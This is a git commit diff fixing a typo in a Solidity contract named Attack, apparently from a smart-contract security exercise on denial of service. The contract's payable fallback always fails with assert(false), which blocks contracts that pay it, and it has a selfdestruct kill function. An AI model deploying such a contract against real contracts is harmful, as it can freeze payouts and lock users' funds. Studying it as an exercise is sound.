b4cea9d5e5340d13e0946601bc0bed3e3f7b494d
gnkz <gnkz@users.noreply.github.com>
2019-01-09 17:59:35 -0300

    Fix typo in denial/Attack.sol

--- denial/Attack.sol
+++ denial/Attack.sol
@@ -1,10 +1,10 @@
-ragma solidity ^0.4.23;
+pragma solidity ^0.4.23;
 
 contract Attack {
     function kill() public {
         selfdestruct(msg.sender);
     }
-    
+
     function() public payable {
         assert(false);
     }
